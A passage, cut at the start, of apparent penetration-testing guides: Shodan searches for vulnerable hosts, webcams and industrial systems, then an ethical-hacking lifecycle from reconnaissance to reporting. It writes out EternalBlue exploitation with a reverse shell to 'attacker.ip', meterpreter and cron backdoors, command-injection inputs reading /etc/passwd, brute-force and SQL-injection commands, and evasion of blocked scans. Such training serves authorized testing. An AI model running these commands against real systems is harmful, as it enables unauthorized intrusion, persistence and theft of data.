# Get statistics on their infrastructure
shodan stats --facets port,product,country 'org:"Target Company"'

# Download detailed data
shodan download target_data.json.gz 'org:"Target Company"'

# Parse for specific info
shodan parse --fields ip_str,port,product target_data.json.gz
```

### Example 2: Vulnerable Service Discovery
```bash
# Find hosts vulnerable to BlueKeep (RDP CVE)
shodan search 'vuln:CVE-2019-0708 country:US'

# Find exposed Elasticsearch with no auth
shodan search 'product:elastic port:9200 -authentication'

# Find Log4j vulnerable systems
shodan search 'vuln:CVE-2021-44228'
```

### Example 3: IoT Device Discovery
```bash
# Find exposed webcams
shodan search 'webcam has_screenshot:true country:US'

# Find industrial control systems
shodan search 'port:502 product:modbus'

# Find exposed printers
shodan search '"HP-ChaiSOE" port:80'

# Find smart home devices
shodan search 'product:nest'
```

### Example 4: SSL/TLS Certificate Analysis
```bash
# Find hosts with specific SSL cert
shodan search 'ssl.cert.subject.cn:*.example.com'

# Find expired certificates
shodan search 'ssl.cert.expired:true org:"Company"'

# Find self-signed certificates
shodan search 'ssl.cert.issuer.cn:self-signed'
```

### Example 5: Python Automation Script
```python
#!/usr/bin/env python3
import shodan
import json

API_KEY = 'YOUR_API_KEY'
api = shodan.Shodan(API_KEY)

def recon_organization(org_name):
    """Perform reconnaissance on an organization"""
    try:
        # Search for organization
        query = f'org:"{org_name}"'
        results = api.search(query)
        
        print(f"[*] Found {results['total']} hosts for {org_name}")
        
        # Collect unique IPs and ports
        hosts = {}
        for result in results['matches']:
            ip = result['ip_str']
            port = result['port']
            product = result.get('product', 'unknown')
            
            if ip not in hosts:
                hosts[ip] = []
            hosts[ip].append({'port': port, 'product': product})
        
        # Output findings
        for ip, services in hosts.items():
            print(f"\n[+] {ip}")
            for svc in services:
                print(f"    - {svc['port']}/tcp ({svc['product']})")
        
        return hosts
        
    except shodan.APIError as e:
        print(f"Error: {e}")
        return None

if __name__ == '__main__':
    recon_organization("Target Company")
```

### Example 6: Network Range Assessment
```bash
# Scan a /24 network range
shodan search 'net:192.168.1.0/24'

# Get port distribution
shodan stats --facets port 'net:192.168.1.0/24'

# Find specific vulnerabilities in range
shodan search 'net:192.168.1.0/24 vuln:CVE-2021-44228'

# Export all data for range
shodan download network_scan.json.gz 'net:192.168.1.0/24'
```

## Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| No API Key Configured | Key not initialized | Run `shodan init YOUR_API_KEY` then verify with `shodan info` |
| Query Credits Exhausted | Monthly credits consumed | Use credit-free queries (no filters), wait for reset, or upgrade |
| Host Recently Crawled | Cannot re-scan IP within 24h | Use `shodan host IP` for existing data, or wait 24 hours |
| Rate Limit Exceeded | >1 request/second | Add `time.sleep(1)` between API requests |
| Empty Search Results | Too specific or syntax error | Use quotes for phrases: `'org:"Company Name"'`; broaden criteria |
| Downloaded File Won't Parse | Corrupted or wrong format | Verify with `gunzip -t file.gz`, re-download with `--limit` |


--- SECTION: ETHICAL-HACKING-METHODOLOGY ---


# Ethical Hacking Methodology

## Purpose

Master the complete penetration testing lifecycle from reconnaissance through reporting. This skill covers the five stages of ethical hacking methodology, essential tools, attack techniques, and professional reporting for authorized security assessments.

## Prerequisites

### Required Environment
- Kali Linux installed (persistent or live)
- Network access to authorized targets
- Written authorization from system owner

### Required Knowledge
- Basic networking concepts
- Linux command-line proficiency
- Understanding of web technologies
- Familiarity with security concepts

## Outputs and Deliverables

1. **Reconnaissance Report** - Target information gathered
2. **Vulnerability Assessment** - Identified weaknesses
3. **Exploitation Evidence** - Proof of concept attacks
4. **Final Report** - Executive and technical findings

## Core Workflow

### Phase 1: Understanding Hacker Types

Classification of security professionals:

**White Hat Hackers (Ethical Hackers)**
- Authorized security professionals
- Conduct penetration testing with permission
- Goal: Identify and fix vulnerabilities
- Also known as: penetration testers, security consultants

**Black Hat Hackers (Malicious)**
- Unauthorized system intrusions
- Motivated by profit, revenge, or notoriety
- Goal: Steal data, cause damage
- Also known as: crackers, criminal hackers

**Grey Hat Hackers (Hybrid)**
- May cross ethical boundaries
- Not malicious but may break rules
- Often disclose vulnerabilities publicly
- Mixed motivations

**Other Classifications**
- **Script Kiddies**: Use pre-made tools without understanding
- **Hacktivists**: Politically or socially motivated
- **Nation State**: Government-sponsored operatives
- **Coders**: Develop tools and exploits

### Phase 2: Reconnaissance

Gather information without direct system interaction:

**Passive Reconnaissance**
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# Subdomain discovery
dnsrecon -d target.com

# Email harvesting
theHarvester -d target.com -b all
```

**Google Hacking (OSINT)**
```
# Find exposed files
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# Find login pages
site:target.com inurl:login
site:target.com inurl:admin

# Find directory listings
site:target.com intitle:"index of"

# Find configuration files
site:target.com filetype:config
site:target.com filetype:env
```

**Google Hacking Database Categories:**
- Files containing passwords
- Sensitive directories
- Web server detection
- Vulnerable servers
- Error messages
- Login portals

**Social Media Reconnaissance**
- LinkedIn: Organizational charts, technologies used
- Twitter: Company announcements, employee info
- Facebook: Personal information, relationships
- Job postings: Technology stack revelations

### Phase 3: Scanning

Active enumeration of target systems:

**Host Discovery**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l

# Discover live hosts
nmap -sP 192.168.1.0/24
```

**Port Scanning**
```bash
# TCP SYN scan (stealth)
nmap -sS target.com

# Full TCP connect scan
nmap -sT target.com

# UDP scan
nmap -sU target.com

# All ports scan
nmap -p- target.com

# Top 1000 ports with service detection
nmap -sV target.com

# Aggressive scan (OS, version, scripts)
nmap -A target.com
```

**Service Enumeration**
```bash
# Specific service scripts
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com

# Vulnerability scanning
nmap --script=vuln target.com
```

**Common Port Reference**
| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure shell |
| 23 | Telnet | Unencrypted remote |
| 25 | SMTP | Email |
| 53 | DNS | Name resolution |
| 80 | HTTP | Web |
| 443 | HTTPS | Secure web |
| 445 | SMB | Windows shares |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote desktop |

### Phase 4: Vulnerability Analysis

Identify exploitable weaknesses:

**Automated Scanning**
```bash
# Nikto web scanner
nikto -h http://target.com

# OpenVAS (command line)
omp -u admin -w password --xml="<get_tasks/>"

# Nessus (via API)
nessuscli scan --target target.com
```

**Web Application Testing (OWASP)**
- SQL Injection
- Cross-Site Scripting (XSS)
- Broken Authentication
- Security Misconfiguration
- Sensitive Data Exposure
- XML External Entities (XXE)
- Broken Access Control
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging & Monitoring

**Manual Techniques**
```bash
# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Web technology fingerprinting
whatweb target.com
```

### Phase 5: Exploitation

Actively exploit discovered vulnerabilities:

**Metasploit Framework**
```bash
# Start Metasploit
msfconsole

# Search for exploits
msf> search type:exploit name:smb

# Use specific exploit
msf> use exploit/windows/smb/ms17_010_eternalblue

# Set target
msf> set RHOSTS target.com

# Set payload
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip

# Execute
msf> exploit
```

**Password Attacks**
```bash
# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Web Exploitation**
```bash
# SQLMap for SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# XSS testing
# Manual: <script>alert('XSS')</script>

# Command injection testing
# ; ls -la
# | cat /etc/passwd
```

### Phase 6: Maintaining Access

Establish persistent access:

**Backdoors**
```bash
# Meterpreter persistence
meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip

# SSH key persistence
# Add attacker's public key to ~/.ssh/authorized_keys

# Cron job persistence
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
```

**Privilege Escalation**
```bash
# Linux enumeration
linpeas.sh
linux-exploit-suggester.sh

# Windows enumeration
winpeas.exe
windows-exploit-suggester.py

# Check SUID binaries (Linux)
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l
```

**Covering Tracks (Ethical Context)**
- Document all actions taken
- Maintain logs for reporting
- Avoid unnecessary system changes
- Clean up test files and backdoors

### Phase 7: Reporting

Document findings professionally:

**Report Structure**
1. **Executive Summary**
   - High-level findings
   - Business impact
   - Risk ratings
   - Remediation priorities

2. **Technical Findings**
   - Vulnerability details
   - Proof of concept
   - Screenshots/evidence
   - Affected systems

3. **Risk Ratings**
   - Critical: Immediate action required
   - High: Address within 24-48 hours
   - Medium: Address within 1 week
   - Low: Address within 1 month
   - Informational: Best practice recommendations

4. **Remediation Recommendations**
   - Specific fixes for each finding
   - Short-term mitigations
   - Long-term solutions
   - Resource requirements

5. **Appendices**
   - Detailed scan outputs
   - Tool configurations
   - Testing timeline
   - Scope and methodology

### Phase 8: Common Attack Types

**Phishing**
- Email-based credential theft
- Fake login pages
- Malicious attachments
- Social engineering component

**Malware Types**
- **Virus**: Self-replicating, needs host file
- **Worm**: Self-propagating across networks
- **Trojan**: Disguised as legitimate software
- **Ransomware**: Encrypts files for ransom
- **Rootkit**: Hidden system-level access
- **Spyware**: Monitors user activity

**Network Attacks**
- Man-in-the-Middle (MITM)
- ARP Spoofing
- DNS Poisoning
- DDoS (Distributed Denial of Service)

### Phase 9: Kali Linux Setup

Install penetration testing platform:

**Hard Disk Installation**
1. Download ISO from kali.org
2. Boot from installation media
3. Select "Graphical Install"
4. Configure language, location, keyboard
5. Set hostname and root password
6. Partition disk (Guided - use entire disk)
7. Install GRUB bootloader
8. Reboot and login

**Live USB (Persistent)**
```bash
# Create bootable USB
dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress

# Create persistence partition
gparted /dev/sdb
# Add ext4 partition labeled "persistence"

# Configure persistence
mkdir /mnt/usb
mount /dev/sdb2 /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### Phase 10: Ethical Guidelines

**Legal Requirements**
- Obtain written authorization
- Define scope clearly
- Document all testing activities
- Report all findings to client
- Maintain confidentiality

**Professional Conduct**
- Work ethically with integrity
- Respect privacy of data accessed
- Avoid unnecessary system damage
- Execute planned tests only
- Never use findings for personal gain

## Quick Reference

### Penetration Testing Lifecycle

| Stage | Purpose | Key Tools |
|-------|---------|-----------|
| Reconnaissance | Gather information | theHarvester, WHOIS, Google |
| Scanning | Enumerate targets | Nmap, Nikto, Gobuster |
| Exploitation | Gain access | Metasploit, SQLMap, Hydra |
| Maintaining Access | Persistence | Meterpreter, SSH keys |
| Reporting | Document findings | Report templates |

### Essential Commands

| Command | Purpose |
|---------|---------|
| `nmap -sV target` | Port and service scan |
| `nikto -h target` | Web vulnerability scan |
| `msfconsole` | Start Metasploit |
| `hydra -l user -P list ssh://target` | SSH brute force |
| `sqlmap -u "url?id=1" --dbs` | SQL injection |

## Constraints and Limitations

### Authorization Required
- Never test without written permission
- Stay within defined scope
- Report unauthorized access attempts

### Professional Standards
- Follow rules of engagement
- Maintain client confidentiality
- Document methodology used
- Provide actionable recommendations

## Troubleshooting

### Scans Blocked

**Solutions:**
1. Use slower scan rates
2. Try different scanning techniques
3. Use proxy or VPN
4. Fragment packets

### Exploits Failing

**Solutions:**
1. Verify target vulnerability exists
2. Check payload compatibility
3. Adjust exploit parameters
4. Try alternative exploits
